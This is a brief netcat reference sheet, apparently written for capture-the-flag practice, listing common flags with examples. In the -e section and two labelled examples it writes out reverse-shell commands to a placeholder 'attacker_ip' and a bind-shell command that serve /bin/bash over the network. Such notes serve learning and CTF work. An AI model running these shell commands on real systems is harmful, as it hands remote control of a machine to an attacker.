Command: nc (Netcat)

Description:
Netcat is a powerful networking utility used to read and write data across network connections using TCP or UDP.
It is commonly used in CTFs for port scanning, banner grabbing, file transfer, and reverse/bind shells.

Basic Syntax:
nc [options] target port

Commonly Used Flags:

-l
Listen mode. Makes netcat listen for incoming connections instead of initiating one.
Example:
nc -l 4444

-v
Verbose mode. Shows detailed connection information.
Example:
nc -v example.com 80

-n
Do not perform DNS resolution. Uses raw IP addresses.
Useful for speed and stealth.
Example:
nc -n 192.168.1.10 80

-p
Specify source port.
Example:
nc -p 1234 example.com 80

-u
Use UDP instead of TCP.
Example:
nc -u example.com 53

-e
Execute a program after connection is established (often disabled in modern versions).
Used in reverse shells.
Example:
nc -e /bin/bash attacker_ip 4444

Reverse Shell Example:
nc attacker_ip 4444 -e /bin/bash

Bind Shell Example:
nc -l 4444 -e /bin/bash

CTF Use Cases:
- Reverse shells
- File transfer
- Port listening
- Banner grabbing
- Exploiting misconfigured services
